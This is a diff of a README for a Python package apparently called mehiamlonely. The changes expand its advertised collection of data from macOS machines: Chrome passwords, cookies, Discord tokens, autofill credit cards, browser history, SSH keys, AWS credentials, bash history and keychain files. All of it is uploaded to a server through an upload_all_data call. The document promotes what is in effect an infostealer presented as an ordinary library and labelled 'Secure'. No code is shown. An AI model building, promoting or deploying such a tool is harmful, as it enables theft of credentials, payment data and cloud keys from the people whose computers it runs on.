@@ -4,9 +4,9 @@ A comprehensive Python library for extracting Chrome passwords, cookies, tokens,
 
 ## Features
 
-- 🔐 **Chrome Data Extraction**: Passwords, cookies, session data, bookmarks
-- 📁 **File System Access**: Browse accessible files on macOS
-- 🖥️ **System Information**: Hardware specs, running processes, disk usage
+- 🔐 **Chrome Data Extraction**: Passwords, cookies, Discord tokens, browser history, localStorage, autofill data, extensions, session data, bookmarks
+- 📁 **File System Access**: Browse accessible files including sensitive files on macOS
+- 🖥️ **System Information**: Hardware specs, running processes, disk usage, network info, logged-in users
 - 🚀 **FastAPI Integration**: Easy upload to your server
 - 💻 **CLI Interface**: Simple terminal commands
 - 🔒 **Secure**: Uses macOS Keychain for Chrome decryption
@@ -70,19 +70,27 @@ result = asyncio.run(mehiamlonely.upload_all_data("http://localhost:8000", data)
 ### Chrome Data
 - **Passwords**: Saved login credentials (decrypted using macOS Keychain)
 - **Cookies**: Session cookies and authentication tokens
+- **Discord Tokens**: Discord authentication tokens from browser storage
+- **Browser History**: URLs, titles, visit counts, and timestamps
+- **LocalStorage**: Key-value pairs stored by websites
+- **Autofill Data**: Credit cards, addresses, and other saved form data
+- **Extensions**: Installed browser extensions and their details
 - **Bookmarks**: All saved bookmarks
 - **Profiles**: Multiple Chrome profiles
 - **Preferences**: Browser settings and extensions
 
 ### File System
-- **User Files**: Desktop, Documents, Downloads, Pictures, etc.
-- **Applications**: Installed applications
-- **File Metadata**: Size, modification date, permissions
+- **User Files**: Desktop, Documents, Downloads, Pictures, Movies, Music, Public
+- **System Files**: Applications, Library files, Preferences
+- **Sensitive Files**: SSH keys, AWS credentials, bash history, keychain files, config files
+- **File Metadata**: Size, modification date, permissions, extensions
 
 ### System Information
-- **Hardware**: CPU, memory, disk usage
-- **Processes**: Running applications
-- **User Info**: Username, hostname, home directory
+- **Hardware**: CPU, memory, disk usage, platform details
+- **Processes**: Running applications with resource usage
+- **Network**: Network interface statistics
+- **Users**: Logged-in users information
+- **User Info**: Username, hostname, home directory, boot time
 
 ## Security & Privacy
 
